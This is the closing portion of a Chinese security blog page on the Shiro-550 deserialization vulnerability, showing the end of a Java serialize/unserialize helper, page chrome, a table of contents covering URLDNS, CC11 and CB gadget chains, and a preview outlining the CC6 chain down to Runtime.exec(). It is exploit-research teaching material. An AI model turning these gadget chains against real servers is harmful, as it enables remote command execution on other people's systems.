objectOutputStream.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void unserialize(String f) throws Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream(f));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260108191605303.png" alt="image-20260108191605241"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://inyyy.github.io">inyyy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://inyyy.github.io/2026/01/08/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://inyyy.github.io/2026/01/08/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://inyyy.github.io" target="_blank">土豆妙妙屋</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928000906169.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/12/30/cc6-HashMap%E9%93%BE/" title="cc6-HashMap链"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">cc6-HashMap链</div></div><div class="info-2"><div class="info-item-1">cc6-hashmap链(通用版cc链）cc6链相比cc1链不受jdk版本限制，在jdk8版本中都能成功运行，需要用到的cc库版本是3.2.1 完整调用链： HashMap.readObject()HashMap.hash()TiedMapEntry.hashCode()TiedMapEntry.getValue()LazyMap.get()ChainedTransformer.transform()InvokerTransformer.transform()Runtime.exec() 一：调用链分析 来到入口类HashMap.readObject()   这段代码的主要功能是对循环读取序列化的键和值，并且利用putVal方法将键值重新存入HashMap，其中的hash(key)是用来计算键的 哈希值，确定键值对在哈希表中的存储位置，根据利用链，跟进hash方法  先对参数key进行判断，如果是null就返回0，有值就调用hashCode方法，先对参数key进行分析，这里key为一个随意的对象，根据链中可以看出传入的key是一个TiedMapEntry对象，追踪TieMapEn...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928000906169.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">inyyy</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/inyyy/inyyy.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">shiro550反序列化漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Shiro-550-%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%A0%B8%E5%BF%83%E9%97%AE%E9%A2%98%E5%9C%A8%E4%BA%8E-Shiro-%E4%BD%BF%E7%94%A8%E7%A1%AC%E7%BC%96%E7%A0%81%E7%9A%84-AES-%E5%8A%A0%E5%AF%86%E5%AF%86%E9%92%A5%E5%A4%84%E7%90%86-rememberMe-cookie%E3%80%82%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E8%BF%99%E4%B8%AA%E5%B7%B2%E7%9F%A5%E7%9A%84%E5%AF%86%E9%92%A5%E5%88%9B%E5%BB%BA%E6%81%B6%E6%84%8F%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%86%E5%85%B6%E4%BD%9C%E4%B8%BA-rememberMe-cookie-%E5%8F%91%E9%80%81%E7%BB%99%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9C%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%99%E4%B8%AA-cookie-%E6%97%B6%EF%BC%8C%E4%BC%9A%E6%89%A7%E8%A1%8C%E5%85%B6%E4%B8%AD%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%EF%BC%8C%E4%BB%8E%E8%80%8C%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.</span> <span class="toc-text">Shiro-550 漏洞的核心问题在于 Shiro 使用硬编码的 AES 加密密钥处理 rememberMe cookie。攻击者可以利用这个已知的密钥创建恶意序列化对象，然后将其作为 rememberMe cookie 发送给服务器。服务器在反序列化这个 cookie 时，会执行其中的恶意代码，从而导致命令执行漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.2.</span> <span class="toc-text">一：环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-shiro550%E5%88%86%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">二:shiro550分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shiro550%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.4.</span> <span class="toc-text">shiro550漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9Aurldns%E9%93%BE"><span class="toc-number">2.4.1.</span> <span class="toc-text">一：urldns链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.4.2.</span> <span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9Acc11%E9%93%BE"><span class="toc-number">2.5.</span> <span class="toc-text">二：cc11链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%EF%BC%9Acb%E9%93%BE"><span class="toc-number">2.5.1.</span> <span class="toc-text">三：cb链</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/08/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="shiro550反序列化">shiro550反序列化</a><time datetime="2026-01-08T11:19:03.000Z" title="发表于 2026-01-08 19:19:03">2026-01-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/30/cc6-HashMap%E9%93%BE/" title="cc6-HashMap链">cc6-HashMap链</a><time datetime="2025-12-30T10:59:19.000Z" title="发表于 2025-12-30 18:59:19">2025-12-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/28/cc2%E9%93%BE%E7%9A%84TemplatesImpl%E5%AD%97%E8%8A%82%E7%A0%81%E9%93%BE/" title="cc4的TemplatesImpl字节码链">cc4的TemplatesImpl字节码链</a><time datetime="2025-12-28T09:49:01.000Z" title="发表于 2025-12-28 17:49:01">2025-12-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/28/cc2%E9%93%BE%E7%9A%84InvokerTransformer%E9%93%BE/" title="cc2链的InvokerTransformer链">cc2链的InvokerTransformer链</a><time datetime="2025-12-28T09:46:23.000Z" title="发表于 2025-12-28 17:46:23">2025-12-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%84%E5%90%88%E6%8B%B3%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" title="记一次组合拳高危漏洞挖掘">记一次组合拳高危漏洞挖掘</a><time datetime="2025-12-11T13:38:12.000Z" title="发表于 2025-12-11 21:38:12">2025-12-11</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928001442720.JPG);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By inyyy</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.0.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.0</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
